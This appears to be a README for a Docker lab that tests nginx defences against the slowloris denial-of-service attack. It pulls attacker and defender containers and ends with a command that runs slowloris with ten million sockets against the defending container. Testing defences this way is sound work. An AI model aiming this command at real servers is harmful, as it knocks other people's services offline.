# slowloris-test

## 1. Pull docker containers for test:
```
docker pull ekleziast/nginx_defense
```
```
docker pull ekleziast/nginx_attack
```
## 2. Run an attacking and defending containers:
```
docker run --name nginx_defense -d -p 80:80 ekleziast/nginx_defense
```
```
docker run --name nginx_attack -d -p 81:80 ekleziast/nginx_attack
```
## 3. Get IP address defending container:
```
docker inspect nginx_defense | grep IPAddress
```
## 4. Run next command to attack the container
```
docker exec -ti nginx_attack slowloris {ip_address_nginx_defense_container} -s 10000000
```
